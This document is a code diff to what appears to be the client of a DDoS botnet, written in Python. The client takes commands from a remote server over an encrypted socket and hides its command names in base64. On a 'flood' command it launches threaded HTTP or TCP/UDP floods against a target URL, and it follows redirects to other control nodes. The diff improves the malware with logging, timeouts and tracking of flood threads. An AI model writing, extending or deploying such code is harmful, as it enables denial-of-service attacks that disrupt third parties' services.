@@ -1,14 +1,17 @@
 import socket
 import time
 import json
+import logging
+from threading import Thread, Event
 from .crypto import Crypto
 from .utilities import parse_url, _decode_str
 from .utilities import NetworkUtilities, Endpoint
+from .logger import getLogger
 
 
 # Client Class
 class Client:
-    def __init__(self, host=_decode_str("MTI3LjAuMC4x"), port=547):
+    def __init__(self, host=_decode_str("MTI3LjAuMC4x"), port=547, debug=False):
         self.server_host = host
         self.server_port = port
         self.crypto = Crypto()
@@ -17,6 +20,9 @@ class Client:
         self.redirects = 0
         self.max_redirects = 5
         self.running = True
+        self.logger = getLogger("Client", debug)
+        self._flood_threads: list[Thread] = []
+        self._shutdown_event = Event()
 
     # Connect to server
     def connect(self):
@@ -24,6 +30,7 @@ class Client:
             try:
                 # Create and connect socket
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.settimeout(10)
                 self.sock.connect((self.server_host, self.server_port))
 
                 # Receive server public key
@@ -87,11 +94,14 @@ class Client:
                 ConnectionError,
                 OSError,
             ) as e:
+                self.logger.warning(f"Connection failed: {e}")
                 time.sleep(5)
             except json.JSONDecodeError as e:
+                self.logger.error(f"Invalid JSON from server: {e}")
                 self.close()
                 break
             except Exception as e:
+                self.logger.error(f"Unexpected error: {e}")
                 self.close()
                 break
             finally:
@@ -99,7 +109,7 @@ class Client:
                     try:
                         self.sock.close()
                     except Exception as e:
-                        pass
+                        self.logger.debug(f"Socket close error: {e}")
                     self.sock = None
 
     # Listen for server messages
@@ -142,8 +152,6 @@ class Client:
                     command = msg_json.get(_decode_str("YWN0aW9u"))
 
                     if command == _decode_str("Zmxvb2Q="):
-                        from threading import Thread
-
                         data = msg_json.get(_decode_str("ZGF0YQ=="), {})
                         endpoint = parse_url(data.get(_decode_str("dXJs"), ""))
                         if not endpoint:
@@ -176,14 +184,14 @@ class Client:
                         )
 
                         if is_l7_http or is_l4_tcp_udp:
-                            from threading import Thread
-
-                            Thread(
+                            t = Thread(
                                 target=lambda: net_utils.execute_request_async(
                                     endpoint, duration, method, threads
                                 ),
                                 daemon=True,
-                            ).start()
+                            )
+                            t.start()
+                            self._flood_threads.append(t)
 
                     elif command == _decode_str("cmVkaXJlY3Q="):
                         current_node = f"{self.server_host}:{self.server_port}"
@@ -210,12 +218,12 @@ class Client:
                         self.connect()
 
                 except KeyError as e:
-                    pass
+                    self.logger.debug(f"Unknown command key: {e}")
                 except json.JSONDecodeError as e:
-                    pass
+                    self.logger.debug(f"Invalid JSON in command: {e}")
 
         except Exception as e:
-            pass
+            self.logger.warning(f"Connection listener error: {e}")
 
         finally:
             if self.sock:
@@ -238,6 +246,10 @@ class Client:
     # Close client
     def close(self):
         self.running = False
+        self._shutdown_event.set()
         if self.sock:
             self.sock.close()
             self.sock = None
+        for t in self._flood_threads:
+            t.join(timeout=3)
+        self._flood_threads.clear()
